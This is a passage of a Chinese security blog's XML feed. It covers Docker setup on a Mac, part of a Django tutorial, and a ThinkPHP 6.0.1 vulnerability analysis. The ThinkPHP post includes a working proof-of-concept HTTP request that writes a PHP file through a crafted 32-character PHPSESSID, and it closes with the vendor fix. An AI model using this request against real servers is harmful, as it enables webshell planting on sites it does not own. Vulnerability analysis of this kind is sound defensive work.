组的成员，因此对所有域控制器都有完全访问权</strong></p><p>打印机操作员组（Print Operators）的成员可以管理网络打印机</p><p>账号操作员组（Account Operators）的成员可以创建和管理该域中的用户和组，并可以设置<br>其权限</p><p>域用户组（Domain Users）是所有域的成员</p><hr>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker基础篇-安装和配置</title>
      <link href="/2020/03/04/docker%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/03/04/docker%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="docker基础篇-安装和配置"><a href="#docker基础篇-安装和配置" class="headerlink" title="docker基础篇-安装和配置"></a>docker基础篇-安装和配置</h1><h2 id="mac上官方安装介绍"><a href="#mac上官方安装介绍" class="headerlink" title="mac上官方安装介绍"></a>mac上官方安装介绍</h2><ul><li><a href="https://docs.docker.com/docker-for-mac/install/" target="_blank" rel="noopener">docker官网mac安装</a></li><li>也可以参考这个</li></ul><h2 id="安装教程开始"><a href="#安装教程开始" class="headerlink" title="安装教程开始"></a>安装教程开始</h2><h4 id="第一步下载"><a href="#第一步下载" class="headerlink" title="第一步下载"></a>第一步下载</h4><p><a href="https://hub.docker.com/editions/community/docker-ce-desktop-mac/" target="_blank" rel="noopener">https://hub.docker.com/editions/community/docker-ce-desktop-mac/</a></p><p>Get Docker</p><table><thead><tr><th>Stable</th><th>Edge</th></tr></thead><tbody><tr><td>The Stable version is fully baked and tested, and comes with the latest GA release of Docker.</td><td>The Edge version offers cutting edge features and comes with <a href="https://docs.docker.com/docker-for-mac/faqs/#what-is-an-experimental-feature" target="_blank" rel="noopener">experimental features turned on</a>.</td></tr><tr><td><a href="https://download.docker.com/mac/stable/Docker.dmg" target="_blank" rel="noopener">Get Docker Desktop for Mac (Stable)</a></td><td><a href="https://download.docker.com/mac/edge/Docker.dmg" target="_blank" rel="noopener">Get Docker Desktop for Mac (Edge)</a></td></tr></tbody></table><p>这有两种</p><ol><li>Stable 季度版本</li><li>Edge 月版本</li></ol><p>完成下载docker.dmg</p><h4 id="第二部安装"><a href="#第二部安装" class="headerlink" title="第二部安装"></a>第二部安装</h4><p>双击正常安装</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-hPsWKcCi-1583302649572)(/Users/zy/Library/Application Support/typora-user-images/image-20200228153121173.png)]</p><h4 id="第三部打开docker"><a href="#第三部打开docker" class="headerlink" title="第三部打开docker"></a>第三部打开docker</h4><p>双击图标，成功打开</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-RE3m0rXu-1583302649573)(/Users/zy/Library/Application Support/typora-user-images/image-20200228153428398.png)]</p><h4 id="第四部登陆"><a href="#第四部登陆" class="headerlink" title="第四部登陆"></a>第四部登陆</h4><ul><li>登录dockerId ，开始安装数据</li><li>如果没有id要求注册一个 <a href="https://hub.docker.com/" target="_blank" rel="noopener">点击注册</a></li><li>成功登陆，安装完毕</li><li>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-pFf43Llq-1583302649573)(/Users/zy/Library/Application Support/typora-user-images/image-20200228153657641.png)]</li></ul><h4 id="第五部检查环境"><a href="#第五部检查环境" class="headerlink" title="第五部检查环境"></a>第五部检查环境</h4><ul><li>docker -v</li><li>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-rLf7Gf9c-1583302649573)(/Users/zy/Library/Application Support/typora-user-images/image-20200228153943668.png)]</li></ul><h4 id="第六部安装Kitematic（可选）"><a href="#第六部安装Kitematic（可选）" class="headerlink" title="第六部安装Kitematic（可选）"></a>第六部安装Kitematic（可选）</h4><ul><li>安装Kitematic</li><li>kitematic是docker推出的GUI工具,使操作docker的方式变得更简单直观。</li></ul><p><a href="https://github.com/docker/kitematic/releases" target="_blank" rel="noopener">https://github.com/docker/kitematic/releases</a></p><p><a href="https://kitematic.com/" target="_blank" rel="noopener">https://kitematic.com</a></p><p>下载<a href="https://github.com/docker/kitematic/releases/download/v0.17.10/Kitematic-0.17.10-Mac.zip" target="_blank" rel="noopener">Kitematic-0.17.10-Mac.zip</a>版本的</p><h2 id="重要的一步-镜像加速"><a href="#重要的一步-镜像加速" class="headerlink" title="重要的一步-镜像加速"></a>重要的一步-镜像加速</h2><p>国内从 DockerHub 拉取镜像有时会遇到困难，此时可以配置镜像加速器。Docker 官方和国内很多云服务商都提供了国内加速器服务，例如：</p><table><thead><tr><th>镜像加速器</th><th>镜像加速器地址</th><th>专属加速</th><th>其它加速</th></tr></thead><tbody><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdocker-cn.com%2Fregistry-mirror" target="_blank" rel="noopener">Docker 中国官方镜像</a></td><td><code>https://registry.docker-cn.com</code></td><td></td><td>Docker Hub</td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdaocloud.io%2Fmirror" target="_blank" rel="noopener">DaoCloud 镜像站</a></td><td><code>http://f1361db2.m.daocloud.io</code></td><td>可登录，系统分配</td><td>Docker Hub</td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FAzure%2Fcontainer-service-for-azure-china%2Fblob%2Fmaster%2Faks%2FREADME.md%2322-container-registry-proxy" target="_blank" rel="noopener">Azure 中国镜像</a></td><td><code>https://dockerhub.azk8s.cn</code></td><td></td><td>Docker Hub、GCR、Quay</td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmirrors.ustc.edu.cn%2Fhelp%2Fdockerhub.html" target="_blank" rel="noopener">科大镜像站</a></td><td><code>https://docker.mirrors.ustc.edu.cn</code></td><td></td><td>Docker Hub、<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fustclug%2Fmirrorrequest%2Fissues%2F91" target="_blank" rel="noopener">GCR</a>、<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fustclug%2Fmirrorrequest%2Fissues%2F135" target="_blank" rel="noopener">Quay</a></td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fcr.console.aliyun.com" target="_blank" rel="noopener">阿里云</a></td><td><code>https://.mirror.aliyuncs.com</code></td><td>需登录，系统分配</td><td>Docker Hub</td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fkirk-enterprise.github.io%2Fhub-docs%2F%23%2Fuser-guide%2Fmirror" target="_blank" rel="noopener">七牛云</a></td><td><code>https://reg-mirror.qiniu.com</code></td><td></td><td>Docker Hub、GCR、Quay</td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fc.163yun.com%2Fhub" target="_blank" rel="noopener">网易云</a></td><td><code>https://hub-mirror.c.163.com</code></td><td></td><td>Docker Hub</td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fcloud.tencent.com%2Fdocument%2Fproduct%2F457%2F9113" target="_blank" rel="noopener">腾讯云</a></td><td><code>https://mirror.ccs.tencentyun.com</code></td><td></td><td>Docker Hub</td></tr></tbody></table><ul><li>对于使用 Mac OS X 的用户</li><li>在任务栏点击 Docker for mac 应用图标-&gt; Perferences…-&gt; Daemon-&gt; Registrymirrors。在列表中填写加速器地址 <strong><a href="https://registry.docker-cn.com" target="_blank" rel="noopener">https://registry.docker-cn.com</a></strong> 。</li><li>修改完成之后，点击 Apply&amp;Restart 按钮，Docker 就会重启并应用配置的镜像地址了。</li><li>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EghncBCs-1583302649574)(/Users/zy/Library/Application Support/typora-user-images/image-20200228162757953.png)]</li></ul>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 6.0.1 漏洞分析（任意文件操作）</title>
      <link href="/2020/02/12/ThinkPHP%206.0.1%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%89/"/>
      <url>/2020/02/12/ThinkPHP%206.0.1%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2020年1月10日，ThinkPHP团队发布一个补丁更新，修复了一处由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell。</p><h4 id="具体受影响版"><a href="#具体受影响版" class="headerlink" title="具体受影响版"></a>具体受影响版</h4><p>ThinkPHP6.0.0-6.0.1。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>/tp60/app/middleware.php 文件开启session</p><p>去掉se注释session的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">    \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>tp5/public/index.php 在控制器中加入测试session的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $sid =$_POST[<span class="string">'key'</span>];</span><br><span class="line">        session(<span class="string">'zeo'</span>,$sid);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">666</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>意思是获取一个key设置写入session中<br>注：使用thinkphp6 最好使用高版本 的php</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先这个洞，我理解是sessionid为进行效验，可以导致传入任意字符，例如xxx.php。而且一般来说sessionid会作为文件名创建对应的文件保存。这是第一步我们的已经实现文件可控，如果session文件再往里面写东西要是可控的话，这样不就可以getshell了，所以我构造了上面的控制器。</p><p>漏洞首先出现的地方是 sessionid可控<br>tp6/vendor/topthink/framework/src/think/session/Store.php<br>121行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * session_id设置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $id session_id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setId</span><span class="params">($id = null)</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;id = is_string($id) &amp;&amp; strlen($id) === <span class="number">32</span> ? $id : md5(microtime(<span class="keyword">true</span>) . session_create_id());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sessionid的设置的时候 为进行效验，只要是32位的就可以</p><p>同一个文件看一下session保存<br>tp6/vendor/topthink/framework/src/think/session/Store.php 254行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 保存session数据</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;clearFlashData();</span><br><span class="line"></span><br><span class="line">       $sessionId = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">           $data = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">$this</span>-&gt;handler-&gt;write($sessionId, $data);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;handler-&gt;delete($sessionId);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;init = <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>先获取session id 然后是 <code>$this-&gt;handler-&gt;write($sessionId, $data);;</code><br>在跟进一下handler<br>只有一个构造函数的初始化 变成一个 SessionHandlerInterface $handler</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, SessionHandlerInterface $handler, array $serialize = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name    = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler = $handler;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($serialize)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;serialize = $serialize;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;setId();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>tp6/vendor/topthink/framework/src/think/middleware/SessionInit.php<br>这里获取到 PHPSESSID 的值 session id传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) &#123;</span><br><span class="line">          $sessionId = $request-&gt;request($varSessionId);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          $sessionId = $request-&gt;cookie($cookieName);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ($sessionId) &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;session-&gt;setId($sessionId);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$request-&gt;cookie($cookieName);这个里面看一下</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> $name = <span class="string">'PHPSESSID'</span>; 发现是这个参数</span><br><span class="line"></span><br><span class="line">所以这个值就从PHPSESSID传就好了</span><br></pre></td></tr></table></figure><p>然后传入Store 中 setId(）函数判断，值检查了32位 就是第一个说的地方</p><p>最后保存session数据 在代码tp6/vendor/topthink/framework/src/think/session/Store.php<br>跟进这个write方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;handler-&gt;write($sessionId, $data);</span><br><span class="line">这里的 handler 是  继承的think\session\driver\file.php</span><br></pre></td></tr></table></figure><p>跟进这个write方法<br>tp6/vendor/topthink/framework/src/think/session/driver/File.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(string $sessID, string $sessData)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getFileName($sessID, <span class="keyword">true</span>);</span><br><span class="line">        $data     = $sessData;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;writeFile($filename, $data);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里有文件名的处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getFileName($sessID, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileName</span><span class="params">(string $name, bool $auto = false)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'prefix'</span>]) &#123;</span><br><span class="line">            <span class="comment">// 使用子目录</span></span><br><span class="line">            $name = <span class="keyword">$this</span>-&gt;config[<span class="string">'prefix'</span>] . DIRECTORY_SEPARATOR . <span class="string">'sess_'</span> . $name;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $name = <span class="string">'sess_'</span> . $name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;config[<span class="string">'path'</span>] . $name;</span><br><span class="line">        $dir      = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>文件名只进行了路径拼接和加前缀</p><p>数据压缩没啥用 跟进 <code>$this-&gt;writeFile($filename, $data);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span><span class="params">($path, $content)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> (bool) file_put_contents($path, $content, LOCK_EX);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>直接写入了。这样就出现问题了，文件名可控，XXX.php 里面的内容是序列化之后的，但是可控制话也说直接getshell</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>根据我写的控制器<br>构造数据包</p><p>注意 session PHPSESSID= 后面要按照要求必须 32位 可以随便构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /tp6/<span class="keyword">public</span>/index.php/index/test1 HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.1</span>; Win64; x64; rv:<span class="number">72.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">72.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 24</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1/tp6/public/index.php/index/test1</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=1234567890123456789012345678.php; </span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">key=&lt;?php%20phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><p>然后就是找到这个文件</p><p>一般位于项目根目录下的./runtime/session/文件夹下，<br>加上之前前缀的拼接，那就是<br>/runtime/session/sess_1234567890123456789012345678.php</p><p>然后成功<br><img src="https://img-blog.csdnimg.cn/20200212175854419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>官方也给出方案</p><p>对session id 加一个过滤 使用 ctype_alnum（）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;id = is_string($id) &amp;&amp; strlen($id) === <span class="number">32</span> ctype_alnum（$id） &amp;&amp; ? $id : md5(microtime(<span class="keyword">true</span>) . session_create_id());</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Django-数据库操作-未完</title>
      <link href="/2020/02/07/Django-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C-%E6%9C%AA%E5%AE%8C/"/>
      <url>/2020/02/07/Django-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C-%E6%9C%AA%E5%AE%8C/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>Django-数据库操作</p><p>在settings.py文件中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql         <span class="comment"># 一定要添加这两行！通过pip install pymysql！</span></span><br><span class="line">pymysql.install_as_MySQLdb()</span><br><span class="line"><span class="comment"># 修改DATABASES的值</span></span><br><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">'default'</span>: &#123;</span><br><span class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</span><br><span class="line">        <span class="string">'NAME'</span>: <span class="string">'mysite'</span>,</span><br><span class="line">        <span class="string">'HOST'</span>: <span class="string">'192.168.1.1'</span>,</span><br><span class="line">        <span class="string">'USER'</span>: <span class="string">'root'</span>,</span><br><span class="line">        <span class="string">'PASSWORD'</span>: <span class="string">'pwd'</span>,</span><br><span class="line">        <span class="string">'PORT'</span>: <span class="string">'3306'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建数据 数据类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    uid = models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 自增长ID,必须带参数为primary_key=True,并且是唯一主键</span></span><br><span class="line">    user = models.CharField(max_length=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 字符串类型，最大长度为10</span></span><br><span class="line">    age = models.IntegerField(default=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 数字类型，默认为1</span></span><br><span class="line">    sex = models.BooleanField()</span><br><span class="line">    <span class="comment"># BOOL类型</span></span><br><span class="line">    email = models.EmailField()</span><br><span class="line">    <span class="comment"># 自带检查 Email 合法性的 CharField</span></span><br><span class="line">    Intor = models.TextField()</span><br><span class="line">    <span class="comment"># 长文本类型</span></span><br><span class="line">    Blog = models.URLField()</span><br><span class="line">    <span class="comment"># 自带检查 URL 合法性的 CharField</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------文件上传-----------------</span></span><br><span class="line">    upload = models.FileField(upload_to=<span class="string">'uploads/'</span>)</span><br><span class="line">    <span class="comment"># 文件上传到 MEDIA_ROOT/uploads</span></span><br><span class="line">    <span class="comment"># 这个字段不能设置primary_key和unique选项.在数据库中存储类型是varchar，默认最大长度为100.</span></span><br><span class="line">    upload_s = models.FileField(upload_to=<span class="string">'uploads/%Y/%m/%d/'</span>)</span><br><span class="line">    <span class="comment"># 文件上传到 MEDIA_ROOT/uploads/2019/07/04</span></span><br><span class="line"></span><br><span class="line">    upload_e = models.FilePathField(path=<span class="string">"/home/images"</span>, match=<span class="string">"foo.*"</span>, recursive=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 这个字段的值被限制在系统上某个目录中的所有文件名集合中。有三个参数</span></span><br><span class="line">    <span class="comment"># 　　　　path = '':  该参数必需。上行所说的‘某个目录’的绝对路径。Example: "/home/images".</span></span><br><span class="line">    <span class="comment"># 　　　　match = 'pattern':  